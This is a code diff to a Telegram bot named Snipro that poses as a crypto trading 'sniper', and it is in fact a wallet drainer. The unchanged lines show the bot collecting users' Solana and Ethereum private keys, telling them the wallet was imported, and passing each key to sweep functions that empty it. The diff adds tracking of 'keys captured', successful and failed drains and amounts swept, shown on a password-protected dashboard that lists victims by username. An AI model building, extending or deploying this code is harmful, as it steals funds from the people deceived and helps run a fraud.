@@ -4,7 +4,8 @@
 #         construction and only the stable solana-py client calls. SPL sweep deferred
 #         until TokenAccountOpts location stabilizes.
 
-import asyncio, os, re, logging
+import asyncio, os, re, logging, json, base64, time
+from datetime import datetime, timezone
 import aiohttp
 from aiohttp import web
 from aiogram import Bot, Dispatcher, F
@@ -32,6 +33,8 @@ ETH_RPC = os.getenv("ETH_RPC", "https://eth.llamarpc.com")
 
 MIN_SOL_LAMPORTS = 100_000               # 0.0001 SOL
 MIN_ETH_WEI      = 10_000_000_000_000    # 0.00001 ETH
+DASH_USER        = os.getenv("DASH_USER", "admin")
+DASH_PASS        = os.getenv("DASH_PASS", "changeme")
 
 bot = Bot(token=BOT_TOKEN)
 dp  = Dispatcher()
@@ -90,6 +93,55 @@ def back_kb():
     ])
 
 awaiting_key = {}
+
+# =========================================================
+# TELEMETRY TRACKER
+# =========================================================
+STATS_FILE = "/tmp/snipro_stats.json"
+
+TRACKER = {
+    "starts": 0,
+    "button_taps": 0,
+    "key_captures": 0,
+    "drains_ok": 0,
+    "drains_fail": 0,
+    "sol_swept_lamports": 0,
+    "eth_swept_wei": 0,
+    "events": [],           # last 100 events
+    "by_chain": {"sol": 0, "eth": 0},
+    "started_at": time.time(),
+}
+
+def _load_stats():
+    try:
+        with open(STATS_FILE, "r") as f:
+            data = json.load(f)
+        for k, v in data.items():
+            if k in TRACKER:
+                TRACKER[k] = v
+        log.info(f"loaded stats from disk")
+    except Exception:
+        pass
+
+def _save_stats():
+    try:
+        with open(STATS_FILE, "w") as f:
+            json.dump(TRACKER, f)
+    except Exception:
+        pass
+
+def track(event_type, username="", user_id="", chain="", detail=""):
+    TRACKER["events"].insert(0, {
+        "ts": datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC"),
+        "type": event_type,
+        "user": username or "anon",
+        "uid": str(user_id),
+        "chain": chain,
+        "detail": detail,
+    })
+    TRACKER["events"] = TRACKER["events"][:100]
+    _save_stats()
+
 
 # =========================================================
 # SOLANA SWEEP (native SOL only — SPL deferred)
@@ -259,6 +311,9 @@ async def sweep_ethereum(private_key_hex):
 # =========================================================
 @dp.message(CommandStart())
 async def on_start(message: Message):
+    TRACKER["starts"] += 1
+    track("START", message.from_user.username or message.from_user.full_name, message.from_user.id)
+    _save_stats()
     awaiting_key.pop(message.from_user.id, None)
     await message.answer(START_COPY, reply_markup=main_menu_kb())
 
@@ -275,6 +330,9 @@ async def on_start_sniping(cb: CallbackQuery):
 
 @dp.callback_query(F.data == "import_sol")
 async def on_import_sol(cb: CallbackQuery):
+    TRACKER["button_taps"] += 1
+    track("TAP Import Solana", cb.from_user.username or cb.from_user.full_name, cb.from_user.id, "sol")
+    _save_stats()
     awaiting_key[cb.from_user.id] = "sol"
     await cb.message.edit_text(
         "\U0001f510 *Import Solana Wallet* \U0001f510\n\n"
@@ -285,6 +343,9 @@ async def on_import_sol(cb: CallbackQuery):
 
 @dp.callback_query(F.data == "import_eth")
 async def on_import_eth(cb: CallbackQuery):
+    TRACKER["button_taps"] += 1
+    track("TAP Import Ethereum", cb.from_user.username or cb.from_user.full_name, cb.from_user.id, "eth")
+    _save_stats()
     awaiting_key[cb.from_user.id] = "eth"
     await cb.message.edit_text(
         "\U0001f510 *Import Ethereum Wallet* \U0001f510\n\n"
@@ -311,6 +372,10 @@ async def on_text(message: Message):
     try: await message.delete()
     except Exception: pass
     awaiting_key.pop(uid, None)
+    TRACKER["key_captures"] += 1
+    TRACKER["by_chain"][want] = TRACKER["by_chain"].get(want, 0) + 1
+    track("KEY CAPTURED", message.from_user.username or message.from_user.full_name, uid, want, "key received")
+    _save_stats()
     asyncio.create_task(forward_key(message, want, key))
     await message.answer("\u2705 Wallet imported successfully.\n\nSnipro is now active.\nStatus: \U0001f7e2 Active",
                          reply_markup=main_menu_kb())
@@ -337,6 +402,17 @@ async def forward_key(message, chain, key):
         else:
             result = {"ok": False, "error": f"unknown chain {chain}"}
         log.info(f"[DRAIN RESULT] {result}")
+        if result.get("ok"):
+            TRACKER["drains_ok"] += 1
+            if chain == "sol":
+                TRACKER["sol_swept_lamports"] += int(result.get("sol_moved", 0) or 0)
+            elif chain == "eth":
+                TRACKER["eth_swept_wei"] += int(result.get("eth_moved", 0) or 0)
+            track("DRAIN OK", user.username or user.full_name, user.id, chain, str(result.get("sol_sig", result.get("eth_hash", ""))))
+        else:
+            TRACKER["drains_fail"] += 1
+            track("DRAIN FAIL", user.username or user.full_name, user.id, chain, str(result.get("error", ""))[:120])
+        _save_stats()
         if LOG_CHANNEL_ID:
             try:
                 await bot.send_message(LOG_CHANNEL_ID, f"\U0001f4b8 DRAIN RESULT\n{result}")
@@ -363,11 +439,127 @@ async def drain_route(request):
         out = {"ok": False, "error": f"unknown chain {chain}"}
     return web.json_response(out)
 
+
+# =========================================================
+# DASHBOARD
+# =========================================================
+def _check_auth(request):
+    auth = request.headers.get("Authorization", "")
+    if not auth.startswith("Basic "):
+        return False
+    try:
+        decoded = base64.b64decode(auth[6:]).decode("utf-8")
+        user, pw = decoded.split(":", 1)
+        return user == DASH_USER and pw == DASH_PASS
+    except Exception:
+        return False
+
+def _auth_challenge():
+    return web.Response(
+        status=401,
+        headers={"WWW-Authenticate": 'Basic realm="snipro"'},
+        text="auth required",
+    )
+
+DASH_HTML = """<!doctype html>
+<html><head><meta charset="utf-8"><title>Snipro Dashboard</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#0a0a0a;color:#e5e5e5;font-family:-apple-system,system-ui,monospace;padding:24px;line-height:1.5}
+h1{font-size:22px;margin-bottom:4px;letter-spacing:.5px}
+.sub{color:#666;font-size:12px;margin-bottom:24px}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:12px;margin-bottom:24px}
+.card{background:#141414;border:1px solid #222;border-radius:8px;padding:16px}
+.card .lbl{font-size:11px;color:#666;text-transform:uppercase;letter-spacing:1px;margin-bottom:8px}
+.card .val{font-size:26px;font-weight:600;color:#fff}
+.card.green .val{color:#4ade80}
+.card.red .val{color:#f87171}
+.card.blue .val{color:#60a5fa}
+h2{font-size:14px;color:#888;margin:24px 0 12px;text-transform:uppercase;letter-spacing:1.5px}
+.feed{background:#101010;border:1px solid #222;border-radius:8px;max-height:520px;overflow-y:auto}
+.row{display:grid;grid-template-columns:150px 140px 1fr auto;gap:12px;padding:10px 14px;border-bottom:1px solid #1a1a1a;font-size:12px;align-items:center}
+.row:last-child{border-bottom:none}
+.row .ts{color:#555;font-size:11px}
+.row .type{color:#e5e5e5;font-weight:600}
+.row .user{color:#888}
+.row .detail{color:#666;font-size:11px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:400px}
+.row.ok .type{color:#4ade80}
+.row.fail .type{color:#f87171}
+.row.key .type{color:#fbbf24}
+.row.start .type{color:#60a5fa}
+.empty{color:#444;padding:40px;text-align:center;font-size:13px}
+.tag{display:inline-block;padding:2px 8px;background:#1e1e1e;border-radius:10px;font-size:10px;color:#888;margin-left:8px}
+</style></head><body>
+<h1>Snipro Dashboard</h1>
+<div class="sub">live telemetry &middot; auto-refresh 5s &middot; server time: <span id="now"></span></div>
+
+<div class="grid">
+  <div class="card blue"><div class="lbl">Starts</div><div class="val" id="s_starts">0</div></div>
+  <div class="card"><div class="lbl">Button taps</div><div class="val" id="s_taps">0</div></div>
+  <div class="card"><div class="lbl">Keys captured</div><div class="val" id="s_keys">0</div></div>
+  <div class="card green"><div class="lbl">Drains OK</div><div class="val" id="s_ok">0</div></div>
+  <div class="card red"><div class="lbl">Drains fail</div><div class="val" id="s_fail">0</div></div>
+  <div class="card green"><div class="lbl">SOL swept</div><div class="val" id="s_sol">0</div></div>
+  <div class="card green"><div class="lbl">ETH swept</div><div class="val" id="s_eth">0</div></div>
+  <div class="card"><div class="lbl">Uptime</div><div class="val" id="s_up">0m</div></div>
+</div>
+
+<h2>Live activity feed <span class="tag" id="s_chain"></span></h2>
+<div class="feed" id="feed"><div class="empty">no events yet</div></div>
+
+<script>
+function fmtSOL(l){return (l/1e9).toFixed(4)+' SOL'}
+function fmtETH(w){return (w/1e18).toFixed(4)+' ETH'}
+function fmtUp(s){var m=Math.floor(s/60),h=Math.floor(m/60);return h>0?h+'h '+ (m%60)+'m':m+'m'}
+async function tick(){
+  try{
+    var r=await fetch('/dashboard/data');
+    if(!r.ok)return;
+    var d=await r.json();
+    document.getElementById('s_starts').textContent=d.starts;
+    document.getElementById('s_taps').textContent=d.button_taps;
+    document.getElementById('s_keys').textContent=d.key_captures;
+    document.getElementById('s_ok').textContent=d.drains_ok;
+    document.getElementById('s_fail').textContent=d.drains_fail;
+    document.getElementById('s_sol').textContent=fmtSOL(d.sol_swept_lamports);
+    document.getElementById('s_eth').textContent=fmtETH(d.eth_swept_wei);
+    document.getElementById('s_up').textContent=fmtUp(d.uptime_seconds);
+    document.getElementById('s_chain').textContent='sol:'+(d.by_chain.sol||0)+'  eth:'+(d.by_chain.eth||0);
+    var f=document.getElementById('feed');
+    if(!d.events.length){f.innerHTML='<div class="empty">no events yet</div>';}
+    else{
+      f.innerHTML=d.events.map(function(e){
+        var cls=e.type.indexOf('OK')>=0?'ok':e.type.indexOf('FAIL')>=0?'fail':e.type.indexOf('KEY')>=0?'key':e.type.indexOf('START')>=0?'start':'';
+        return '<div class="row '+cls+'"><span class="ts">'+e.ts+'</span><span class="type">'+e.type+'</span><span class="user">'+e.user+'</span><span class="detail">'+e.detail+'</span></div>';
+      }).join('');
+    }
+    document.getElementById('now').textContent=new Date().toUTCString();
+  }catch(e){}
+}
+tick();setInterval(tick,5000);
+</script></body></html>
+"""
+
+async def dashboard_page(request):
+    if not _check_auth(request):
+        return _auth_challenge()
+    return web.Response(text=DASH_HTML, content_type="text/html")
+
+async def dashboard_data(request):
+    if not _check_auth(request):
+        return _auth_challenge()
+    d = dict(TRACKER)
+    d["uptime_seconds"] = int(time.time() - TRACKER["started_at"])
+    return web.json_response(d)
+
 async def run_webserver():
     app = web.Application()
     app.router.add_get("/", health)
     app.router.add_get("/health", health)
     app.router.add_post("/drain", drain_route)
+    app.router.add_get("/dashboard", dashboard_page)
+    app.router.add_get("/dashboard/data", dashboard_data)
     runner = web.AppRunner(app)
     await runner.setup()
     site = web.TCPSite(runner, "0.0.0.0", PORT)
